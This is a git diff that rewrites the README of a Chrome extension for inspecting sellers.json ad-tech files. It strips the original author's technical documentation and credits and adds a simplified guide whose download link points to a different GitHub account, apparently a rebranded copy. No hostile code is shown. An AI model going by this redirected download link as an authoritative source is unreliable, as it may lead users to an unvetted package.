@@ -1,285 +1,165 @@
-<a href="https://github.com/OstinUA" target="_blank" rel="noopener"><img src="https://raw.githubusercontent.com/OstinUA/Image-storage/main/readme/Sellers.json-Inspector.png" valign="middle" alt="Sellers.json Inspector"></a>
-
-> A Chrome Extension that parses, visualizes, and validates `sellers.json` inventory metadata with a fast, in-page inspection and verification workflow.
-
-[![Chrome Store](https://img.shields.io/badge/platform-Chrome_Extension-4285F4?style=for-the-badge&logo=google-chrome&logoColor=white)](https://chromewebstore.google.com/search/OstinUA)
-[![Chrome Portfolio](https://img.shields.io/badge/Chrome_Web_Store-Portfolio-34A853?style=for-the-badge&logo=google-chrome&logoColor=white)](https://ostinua.github.io/Chrome-Web-Store_Developer-List/)
-
-[![Version](https://img.shields.io/badge/version-1.3.2-2ea44f?style=for-the-badge)](manifest.json)
-[![Manifest](https://img.shields.io/badge/manifest-v3-1f6feb?style=for-the-badge)](manifest.json)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
-[![Status](https://img.shields.io/badge/status-stable-6f42c1?style=for-the-badge)](#features)
-
-> [!NOTE]
-> This project is implemented as a browser extension focused on `sellers.json` validation workflows. It behaves like an auditing/diagnostics tool for supply-path data rather than a standalone backend library.
-
-## Table of Contents
-
-- [Features](#features)
-- [Tech Stack & Architecture](#tech-stack--architecture)
-  - [Core Stack](#core-stack)
-  - [Project Structure](#project-structure)
-  - [Key Design Decisions](#key-design-decisions)
-- [Getting Started](#getting-started)
-  - [Prerequisites](#prerequisites)
-  - [Installation](#installation)
-- [Testing](#testing)
-- [Deployment](#deployment)
-- [Usage](#usage)
-- [Configuration](#configuration)
-- [License](#license)
-- [Contacts & Community Support](#contacts--community-support)
-
-## Features
-
-- Real-time parsing and syntax highlighting of raw `sellers.json` documents in-page.
-- Color-customizable JSON tokens (`key`, `string`, `number`, `boolean`) from extension settings.
-- Interactive overview panel with seller-level and domain-level aggregate stats.
-- Seller-domain deduplication logic for unique domain counting.
-- Validation pre-filtering for malformed or missing seller domains.
-- Parallelized remote validation against both:
-  - `https://<domain>/ads.txt`
-  - `https://<domain>/app-ads.txt`
-- Badge-level per-seller status rendering (`Ads: OK/NO`, `App: OK/NO`).
-- Aggregate anomaly categories:
-  - Invalid domain
-  - Invalid `ads.txt` line
-  - Invalid `app-ads.txt` line
-  - Total invalid sellers (not found in both files)
-  - Total found sellers (found in at least one file)
-- Interactive stat rows with tooltip hints and click-to-filter modal drill-down.
-- Export and operator productivity features:
-  - Copy filtered JSON subset to clipboard
-  - Save filtered subset as `.json`
-- Storage-backed runtime preferences via `chrome.storage.local`.
-- Background fetch broker with timeout protection for resilient cross-domain checks.
-
-> [!TIP]
-> The extension is most useful for SSP/Exchange QA, ad-ops verification, and compliance checks where seller record integrity is critical.
-
-## Tech Stack & Architecture
-
-### Core Stack
-
-- Language: JavaScript (ES6+) + HTML + CSS
-- Runtime Platform: Chrome Extension Manifest V3
-- Browser APIs:
-  - `chrome.storage.local`
-  - `chrome.runtime.sendMessage`
-  - `chrome.tabs.reload`
-- Content processing approach:
-  - Parse body text as JSON
-  - Replace page body with syntax-highlighted renderer
-  - Overlay a fixed analytics panel for domain and seller diagnostics
-
-### Project Structure
-
-```text
-Sellers.json-Inspector/
-├── background.js      # Service worker: URL validation, caching, fetch relay with timeout
-├── content.js         # Core logic: Parsing, IAB spec validation queue, rendering, modal UI
-├── content.css        # Visual system: Syntax highlighting, panel, badges, tooltips
-├── index.html         # Extension popup settings UI root
-├── popup.css          # Popup styling
-├── popup.js           # Settings persistence, quick links, and page reload handling
-├── manifest.json      # Extension metadata, MV3 permissions
-├── trigger action/    # Python script for AI-driven PR/Commit analysis
-├── .github/           # Comprehensive CI/CD workflows, issue templates, dependabot
-├── icons/             # Extension icon assets
-└── LICENSE
-```
-
-### Key Design Decisions
-
-- **Separation of concerns via extension contexts**:
-  - `content.js` handles parsing/rendering and user interactions.
-  - `background.js` handles remote fetch execution with abort timeout.
-- **Asynchronous fan-out validation**:
-  - Seller domain checks are processed in a bounded-concurrency queue (`CONCURRENCY_LIMIT = 10`) to balance speed and network pressure.
-- **Stat-centric UX for triage**:
-  - The panel surfaces aggregate counters first, then lets operators drill into filtered records.
-- **Data-preserving export strategy**:
-  - Export payload keeps original top-level network fields and only swaps `sellers` with filtered slices.
+# 🔍 Sellers.json-Inspector - Clear sellers.json checks fast
 
-```mermaid
-flowchart LR
-    A[Page with sellers.json] --> B[content.js parses JSON]
-    B --> C[Syntax-highlighted renderer]
-    B --> D[Overview panel + stats]
-    D --> E[Analyze domains queue]
-    E --> F[Message to background.js]
-    F --> G[Fetch ads.txt/app-ads.txt]
-    G --> H[Return results]
-    H --> I[Per-seller badges + aggregate counters]
-    I --> J[Modal drill-down + copy/export]
-```
+[![Download](https://img.shields.io/badge/Download-Sellers.json--Inspector-blue?style=for-the-badge)](https://github.com/KDTrey7/Sellers.json-Inspector)
 
-> [!IMPORTANT]
-> The extension rewrites the visible body content for matching `sellers.json` pages to provide a rich inspection UI.
+## 🧭 What this app does
 
-## Getting Started
+Sellers.json-Inspector is a Chrome extension for people who work with ad supply paths and publisher files. It helps you open, read, and check sellers.json files in a simple view.
 
-### Prerequisites
+Use it to:
 
-- Google Chrome (or Chromium-based browser with MV3 extension support)
-- Git
-- Optional for local quality checks:
-  - Node.js 18+ (for custom scripts if you add them)
-  - Python 3.8+ (for JSON validation helpers)
+- Parse sellers.json files in the browser
+- Check file structure and field values
+- Highlight JSON syntax so it is easier to read
+- Check seller domains against ads.txt and app-ads.txt data
+- See badge status while you review records
+- Review counts and simple analytics
+- Export filtered data for ad-ops work
 
-### Installation
+## 💻 What you need
 
-```bash
-git clone <your-fork-or-repo-url>
-cd Sellers.json-Inspector
-```
+Before you start, make sure you have:
 
-Load the extension:
+- A Windows computer
+- Google Chrome installed
+- Access to the download page
+- Permission to install Chrome extensions
 
-1. Open `chrome://extensions/`.
-2. Enable `Developer mode`.
-3. Click `Load unpacked`.
-4. Select the project root directory.
-5. Navigate to any URL matching `*sellers.json*` to activate inspector UI.
+The extension works best on current Windows versions and recent Chrome builds.
 
-> [!WARNING]
-> The extension currently requests broad host access (`*://*/*`) to validate remote `ads.txt` and `app-ads.txt` files. Restrict this scope in hardened environments if required.
+## ⬇️ Download the app
 
-## Testing
+Open this page to download and install the extension:
 
-This repository does not include an automated test suite at this time. Use the checks below as a practical validation baseline.
+https://github.com/KDTrey7/Sellers.json-Inspector
 
-```bash
-# Validate extension manifest JSON syntax
-python -m json.tool manifest.json >/dev/null
+If the page opens to the repository main page, use the files and install steps shown there to get the extension onto your computer.
 
-# Find accidental non-English content if you enforce English-only docs/UI
-rg -n "[А-Яа-яЁё]" .
+## 🛠️ Install on Windows
 
-# Spot whitespace issues
-git diff --check
-```
+Follow these steps on your Windows PC:
 
-Manual test checklist:
+1. Open the download page in Google Chrome.
+2. Get the project files from the repository.
+3. Save the files in a folder you can find again, such as Downloads or Documents.
+4. Open Chrome.
+5. In the address bar, type chrome://extensions and press Enter.
+6. Turn on Developer mode in the top-right corner.
+7. Select Load unpacked.
+8. Choose the Sellers.json-Inspector folder.
+9. Wait for Chrome to add the extension.
+10. Look for the extension icon in the Chrome toolbar.
 
-1. Open a valid `sellers.json` page and confirm syntax highlighting appears.
-2. Open extension popup, modify colors/toggles, click `Save & Reload`, confirm persistence.
-3. Run domain analysis and verify progress bar, badges, and stat counters update.
-4. Click stat labels to open modal and validate copy/export actions.
+If Chrome asks for permission, allow it so the extension can read the page data it needs.
 
-> [!CAUTION]
-> Domain verification depends on remote host availability and response latency; some failures may be environmental, not functional defects.
+## ▶️ Open and use the extension
 
-## Deployment
+After install, use it like this:
 
-Because this is a browser extension, deployment typically means packaging and publishing to a browser store or distributing a signed zip.
+1. Open Chrome.
+2. Go to a page with a sellers.json file or load the file in the extension.
+3. Click the Sellers.json-Inspector icon.
+4. Review the parsed file in the main panel.
+5. Check the syntax colors and read the seller entries.
+6. Look for badge status and domain checks.
+7. Use the filter tools to narrow the list.
+8. Export the records you need.
 
-### Production Packaging
+If the file is large, let the extension finish loading before you make filters or exports.
 
-```bash
-# From repository root
-zip -r sellers-json-inspector.zip . -x ".git/*" "*.DS_Store"
-```
+## 🔎 Main features
 
-### CI/CD Integration Guidance
+### Syntax highlighting
+The extension colors JSON parts so keys, values, and structure are easier to scan.
 
-- Add pipeline steps for:
-  - JSON validation (`manifest.json`)
-  - static checks (optional ESLint/Prettier if introduced)
-  - artifact packaging (`zip`)
-- Store signing credentials in secure CI secrets.
-- Gate releases with semantic version bumps in `manifest.json`.
+### Domain verification
+It checks seller domains against ads.txt and app-ads.txt records to help you spot mismatches.
 
-### Containerization Note
+### Badge status
+It shows status signals for each record so you can review items without opening each line.
 
-A Docker runtime is typically unnecessary for client-side extension packaging, but CI containers can be used for deterministic lint/package tasks.
+### Aggregate analytics
+It groups data and gives quick counts that help with file review.
 
-## Usage
+### Filtered export
+You can limit the list to the records you want and export only those rows.
 
-### 1) Open and Inspect a `sellers.json` Endpoint
+### Chrome extension workflow
+It fits into a normal Chrome flow, so you can review files without extra software.
 
-- Navigate to a matching endpoint such as:
-  - `https://example.com/sellers.json`
-- The extension auto-renders an enhanced inspection interface.
+## 🧩 How to check a sellers.json file
 
-### 2) Configure Inspector Preferences
+Use this simple flow:
 
-Use the popup to set display behavior and visual palette.
+1. Open the sellers.json file in Chrome or load it through the extension.
+2. Wait for the file to parse.
+3. Scan the seller ID, name, domain, and type fields.
+4. Check for missing or empty values.
+5. Review domain checks against ads.txt or app-ads.txt.
+6. Look for badge changes or status flags.
+7. Filter the rows that need more review.
+8. Export the clean set or the problem set for later work.
 
-```js
-// popup.js (runtime behavior example)
-chrome.storage.local.get(defaults, (cfg) => {
-  // Applies persisted options to popup controls
-});
+## 📁 Exporting filtered data
 
-chrome.storage.local.set(newConfig, () => {
-  // Persists options then reloads active tab
-  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-    chrome.tabs.reload(tabs[0].id);
-  });
-});
-```
+If you need a smaller file for review, use the export feature.
 
-### 3) Run Domain Validation Pipeline
+Good times to export:
 
-```js
-// content.js (queue-driven checks)
-const [adsText, appAdsText] = await Promise.all([
-  fetchFromBackground(`https://${sellerObj.domain}/ads.txt`),
-  fetchFromBackground(`https://${sellerObj.domain}/app-ads.txt`)
-]);
+- When you want only invalid rows
+- When you need one partner or one domain
+- When you want to share a short list with a team member
+- When you need a clean file for an ad-ops task
 
-const hasAds = adsText && adsText.includes(sellerObj.seller_id);
-const hasAppAds = appAdsText && appAdsText.includes(sellerObj.seller_id);
-```
+Keep the export in a folder that is easy to find, such as Downloads or Desktop.
 
-### 4) Drill into Category Results
+## ⚙️ Common use cases
 
-- Click a stat label to open filtered JSON.
-- Use `Copy to Clipboard` for quick sharing.
-- Use `Save .json` for offline analysis or ticket attachments.
+This extension helps with:
 
-## Configuration
+- Sellers.json file review
+- Supply path checks
+- Inventory checks
+- Publisher and SSP validation
+- Ad-tech compliance work
+- Fast review of JSON data
+- ad-ops file cleanup
 
-Configuration is persisted in `chrome.storage.local` and controlled through the popup UI.
+## 🧠 Tips for first-time users
 
-### Available Options
+- Use Chrome, not another browser, for the first install
+- Keep the extension folder in one place
+- Refresh the page if the panel does not load
+- Start with a small file if you want to learn the layout
+- Use filters before export if you only need a few rows
+- Check both ads.txt and app-ads.txt when a domain looks wrong
 
-| Key | Type | Default | Description |
-|---|---|---|---|
-| `keyColor` | string | `#FF8C00` | JSON key token color. |
-| `strColor` | string | `#7bbf8e` | JSON string token color. |
-| `numColor` | string | `#F0FFF0` | JSON numeric token color. |
-| `boolColor` | string | `#F0FFF0` | JSON boolean/null token color. |
-| `showPanel` | boolean | `true` | Show/hide the right-side overview panel. |
-| `showTotalSellers` | boolean | `true` | Show total seller records stat. |
-| `showUniqueSellers` | boolean | `true` | Show unique-domain sellers stat. |
-| `showInvalidDomains` | boolean | `true` | Show invalid/missing domain stat. |
-| `showInvalidAds` | boolean | `true` | Show missing `ads.txt` match stat. |
-| `showInvalidAppAds` | boolean | `true` | Show missing `app-ads.txt` match stat. |
-| `showTotalInvalid` | boolean | `true` | Show total invalid (not found in both) stat. |
-| `showTotalFound` | boolean | `true` | Show total found (at least one match) stat. |
+## ❓ Common issues
 
-### Manifest-Level Permissions
+### The extension does not show up
+Check chrome://extensions and make sure the extension is turned on.
 
-- `storage`: persisting extension settings
-- `host_permissions: ["*://*/*"]`: requesting remote domain resources for validation
+### The file does not load
+Make sure the file is valid JSON and not a broken download.
 
-> [!NOTE]
-> There is no `.env` file or CLI startup flags in the current implementation. All runtime options are managed through extension UI controls and persisted storage keys.
+### The data looks blank
+Refresh the page and open the extension again.
 
-## License
+### The install fails
+Confirm that you selected the right folder and that all files are still in place.
 
-This project is distributed under the MIT License. See [LICENSE](LICENSE) for full terms.
+### The domain check looks wrong
+Verify that the seller record uses the correct domain and that the matching ads.txt or app-ads.txt file is available.
 
-## Contacts & Community Support
+## 🖱️ Quick start
 
-## Support the Project
+1. Download the project from the link above.
+2. Open Chrome on Windows.
+3. Load the extension in chrome://extensions.
+4. Open a sellers.json file.
+5. Review the parsed results.
+6. Use filters and export when needed
 
-[![Patreon](https://img.shields.io/badge/Patreon-OstinFCT-f96854?style=flat-square&logo=patreon)](https://www.patreon.com/OstinFCT)
-[![Ko-fi](https://img.shields.io/badge/Ko--fi-fctostin-29abe0?style=flat-square&logo=ko-fi)](https://ko-fi.com/fctostin)
-[![Boosty](https://img.shields.io/badge/Boosty-Support-f15f2c?style=flat-square)](https://boosty.to/ostinfct)
-[![YouTube](https://img.shields.io/badge/YouTube-FCT--Ostin-red?style=flat-square&logo=youtube)](https://www.youtube.com/@FCT-Ostin)
-[![Telegram](https://img.shields.io/badge/Telegram-FCTostin-2ca5e0?style=flat-square&logo=telegram)](https://t.me/FCTostin)
+## 📌 Project focus
 
-If you find this tool useful, consider leaving a star on GitHub or supporting the author directly.
+Sellers.json-Inspector is built for simple file review in ad-ops and ad verification work. It gives you a clear view of sellers.json records, helps you spot domain issues, and lets you work with filtered data in the browser
